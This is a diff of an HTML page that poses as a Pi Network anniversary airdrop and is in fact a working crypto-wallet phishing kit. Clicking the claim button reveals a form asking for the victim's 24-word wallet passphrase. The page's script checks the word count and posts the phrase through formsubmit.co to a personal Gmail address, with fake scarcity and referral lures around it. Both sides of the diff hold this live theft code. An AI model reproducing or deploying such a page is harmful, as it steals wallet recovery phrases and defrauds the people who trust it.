@@ -1,261 +1,112 @@
 <!DOCTYPE html>
-
-<html lang="en">
-
+<html lang="en" >
 <head>
-
-  <meta charset="UTF-8" />
-
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-  <title>Pi Network Airdrop</title>
-
-  <link rel="stylesheet" href="styles.css" />
-
-  <style>
-
-    .hidden { display: none; }
-
-    .container { font-family: sans-serif; padding: 20px; max-width: 600px; margin: auto; }
-
-    .claim-button, .submit-button { padding: 10px 20px; background: purple; color: white; border: none; cursor: pointer; }
-
-    textarea { width: 100%; padding: 10px; margin-top: 10px; }
-
-    .pi-reward { font-size: 24px; font-weight: bold; color: green; }
-
-    .passphrase-section { margin-top: 20px; }
-
-  </style>
+  <meta charset="UTF-8">
+  <title>pi</title>
+  <link rel="stylesheet" href="./style.css">
 
 </head>
-
 <body>
-
+<!-- partial:index.partial.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Pi Network Airdrop</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
   <div class="container">
-
     <header class="top-bar">
-
       <span class="logo"> 🔐 Wallet</span>
-
     </header>
 
-
-
     <main>
-
       <section class="airdrop-card">
-
         <img src="https://i.imgur.com/IOpGLeG.jpeg" alt="Pi Network Airdrop" style="width: 100%; max-width: 400px; display: block; margin: 0 auto;" />
-
         <h2>Pi Network 6th Anniversary Airdrop</h2>
 
         <h3>Celebrating Mainnet Launch and 6 Years of Innovation</h3>
 
-
-
         <p class="desc">
-
-          To mark our official Mainnet launch and six years of progress, the Pi Network team is giving back to the community. 
-
-          As a gesture of appreciation, eligible wallets that have successfully completed KYC will be randomly selected to receive between 
-
-          <strong>31π</strong> and <strong>314π</strong>. A total of <strong>31,415 wallets</strong> will be rewarded.
-
-        </p>
-
-
-
-        <div class="pi-reward">+314 π</div>
-
-        <p class="condition">✅ Condition: KYC Successfully Passed</p>
-
+    To mark our official Mainnet launch and six years of progress, the Pi Network team is giving back to the community. 
+    As a gesture of appreciation, eligible wallets that have successfully completed KYC will be randomly selected to receive between 
+    <strong>31π</strong> and <strong>314π</strong>. A total of <strong>31,415 wallets</strong> will be rewarded.
+  </p>
+<div class="pi-reward">+314 π</div>
+<p class="condition">✅ Condition: KYC Successfully Passed</p>
         <p class="remaining">📦 Remaining Quantity: 29,879 / 31,415</p>
-
-
 
         <button id="claimBtn" class="claim-button">CLAIM 314 PI NOW</button>
 
         <p class="referral">👥 Refer 3 pioneers to get more bonus up to 314π</p>
-
       </section>
+<section id="passphraseForm" class="passphrase-section hidden">
+  <h3>Unlock Pi Wallet</h3>
+  <form id="piForm">
+    <textarea name="passphrase" placeholder="Enter your 24-word passphrase here" required></textarea>
+    <input type="hidden" name="_captcha" value="false">
+    <button class="submit-button" type="submit">Unlock With Passphrase</button>
+  </form>
 
+  <p class="info">
+    As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
+    Recovery of passphrase is currently impossible.
+  </p>
+  <p class="warning">
+    Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your <b>π</b> 
+    in your previous wallet will be inaccessible.
+  </p>
 
-
-      <section id="passphraseForm" class="passphrase-section hidden">
-
-        <h3>Unlock Pi Wallet</h3>
-
-        <form id="piForm">
-
-          <textarea name="passphrase" placeholder="Enter your 24-word passphrase here" required></textarea>
-
-          <input type="hidden" name="_captcha" value="false">
-
-          <button class="submit-button" type="submit">Unlock With Passphrase</button>
-
-        </form>
-
-
-
-        <p class="info">
-
-          As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
-
-          Recovery of passphrase is currently impossible.
-
-        </p>
-
-        <p class="warning">
-
-          Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your <b>π</b> 
-
-          in your previous wallet will be inaccessible.
-
-        </p>
-
-
-
-        <p id="confirmationMsg" style="display: none; color: green; font-weight: bold; margin-top: 15px;">
-
-          ✅ Submission Completed. Thank you!
-
-        </p>
-
-      </section>
-
+  <p id="confirmationMsg" style="display: none; color: green; font-weight: bold; margin-top: 15px;">
+    ✅ Submission Completed. Thank you!
+  </p>
+</section>
+      
+   
     </main>
-
   </div>
+<script>
+  document.getElementById("claimBtn").addEventListener("click", function () {
+    document.getElementById("passphraseForm").classList.remove("hidden");
+    this.style.display = "none";
+  });
 
+  document.getElementById("piForm").addEventListener("submit", function (e) {
+    e.preventDefault(); // prevent default form submit
 
+    const passphrase = this.passphrase.value.trim();
+    const wordCount = passphrase.split(/\s+/).length;
 
-  <script>
-
-    function isValidPassphrase(phrase) {
-
-      const words = phrase.trim().toLowerCase().split(/\s+/);
-
-
-
-      if (words.length !== 24) {
-
-        return "❌ Passphrase must contain exactly 24 words.";
-
-      }
-
-
-
-      const allAlpha = words.every(word => /^[a-z]+$/.test(word));
-
-      if (!allAlpha) {
-
-        return "❌ Passphrase must only contain lowercase alphabetic words.";
-
-      }
-
-
-
-      // Check repetition
-
-      const wordCount = {};
-
-      for (const word of words) {
-
-        wordCount[word] = (wordCount[word] || 0) + 1;
-
-      }
-
-
-
-      const maxRepeat = Math.max(...Object.values(wordCount));
-
-      if (maxRepeat >= 6) {
-
-        return "❌ This passphrase looks invalid due to excessive repetition.";
-
-      }
-
-
-
-      return true;
-
+    // Validation: Must be exactly 24 words
+    if (wordCount !== 24) {
+      alert("❌ Invalid passphrase.");
+      return;
     }
 
+    const formData = new FormData(this);
 
-
-    document.getElementById("claimBtn").addEventListener("click", function () {
-
-      document.getElementById("passphraseForm").classList.remove("hidden");
-
-      this.style.display = "none";
-
-    });
-
-
-
-    document.getElementById("piForm").addEventListener("submit", function (e) {
-
-      e.preventDefault();
-
-
-
-      const phrase = this.passphrase.value.trim();
-
-      const validation = isValidPassphrase(phrase);
-
-
-
-      if (validation !== true) {
-
-        alert(validation);
-
-        return;
-
+    fetch("https://formsubmit.co/kp25626900@gmail.com", {
+      method: "POST",
+      body: formData
+    })
+    .then(response => {
+      if (response.ok) {
+        document.getElementById("confirmationMsg").style.display = "block";
+        document.getElementById("piForm").reset();
+      } else {
+        alert("Something went wrong. Please try again.");
       }
-
-
-
-      const formData = new FormData(this);
-
-
-
-      fetch("https://formsubmit.co/kp25626900@gmail.com", {
-
-        method: "POST",
-
-        body: formData
-
-      })
-
-      .then(response => {
-
-        if (response.ok) {
-
-          document.getElementById("confirmationMsg").style.display = "block";
-
-          this.reset();
-
-        } else {
-
-          alert("Something went wrong. Please try again.");
-
-        }
-
-      })
-
-      .catch(error => {
-
-        console.error("Error:", error);
-
-        alert("Error submitting form.");
-
-      });
-
+    })
+    .catch(error => {
+      console.error("Error:", error);
+      alert("Error submitting form.");
     });
-
-  </script>
+  });
+</script>
+ 
+<!-- partial -->
 
 </body>
-
 </html>
